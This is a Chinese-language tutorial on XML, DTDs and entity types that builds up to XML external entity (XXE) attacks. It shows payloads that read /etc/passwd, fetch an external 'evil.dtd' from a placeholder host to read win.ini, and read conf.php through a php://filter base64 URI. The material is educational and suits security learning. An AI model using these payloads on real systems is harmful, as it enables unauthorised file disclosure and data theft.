## 一、什么是XML

XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

## 二、XML文件的文档结构

XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

```
<!--XML声明-->
<?xml version="1.0"?>
<!--文档类型定义-->
<!DOCTYPE note [  <!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)>  <!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>     <!--定义to元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)>   <!--定义from元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->
]]]>
<!--文档元素-->
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>You are a good man</body>
</note>
```

## 三、DTD文档类型定义

XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

### 1、内部声明DTD：

```
<!DOCTYPE 根元素 [元素声明]>
```

### 2、引用外部DTD：

```
<!DOCTYPE 根元素 SYSTEM "文件名">
```

### 3、内外部DTD文档结合：

```
<!DOCTYPE 根元素 SYSTEM "DTD文件路径" [定义内容]>
```

### 4、DTD中的一些重要的关键字：

- DOCTYPE（DTD的声明）
- ENTITY（实体的声明）
- SYSTEM、PUBLIC（外部资源申请）

## 四、实体类别介绍

实体主要分为一下四类

- 内置实体 (Built-in entities)
- 字符实体 (Character entities)
- 通用实体 (General entities)
- 参数实体 (Parameter entities)

参数实体用%实体名称申明，引用时也用%实体名称;

其余实体直接用实体名称申明，引用时用&实体名称。

参数实体只能在DTD中申明，DTD中引用；

其余实体只能在DTD中申明，可在xml文档中引用。

### 1、内部实体声明

```
<!ENTITY 实体名称 “实体的值”>
```

一个实体由三部分构成:&符号, 实体名称, 分号 (😉，这里&不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&符号会被认为是参数间的连接符号，示例：

```
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY xxe "Thinking">]>
<foo>&xxe;</foo>
```

### 2、外部实体声明

XML中对数据的引用称为实体，实体中有一类叫外部实体，用来引入外部资源，有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以借助各种协议，比如如下的三种：

```
file:///path/to/file.ext
http://url
php://filter/read=convert.base64-encode/resource=conf.php
<!ENTITY 实体名称 SYSTEM “URI/URL”>
```

外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：

![image.png](http://secevery.oss-cn-beijing.aliyuncs.com/images/article/2021/8/2/1630574789569.png?x-oss-process=style/ImageWaterMark_V1.0)

示例：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xdsec [
<!ELEMENT methodname ANY >
<!ENTITY xxe(实体引用名) SYSTEM "file:///etc/passwd"(实体内容) >]>
<methodcall>
<methodname>&xxe;</methodname>
</methodcall>
```

这种写法则调用了本地计算机的文件/etc/passwd，XML内容被解析后，文件内容便通过&xxe被存放在了methodname元素中，造成了敏感信息的泄露。

### 3、参数实体声明

```
<!ENTITY 实体名称 SYSTEM “URI/URL”>
```

示例：

```
<!DOCTYPE foo [<!ELEMENT foo ANY >
<!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" >
%xxe;]>
<foo>&evil;</foo>
```

外部evil.dtd中的内容：

```
<!ENTITY evil SYSTEM “file:///c:/windows/win.ini” >
```

### 4、引用公共实体

```
<!ENTITY 实体名称 PUBLIC "public_ID" "URI">
```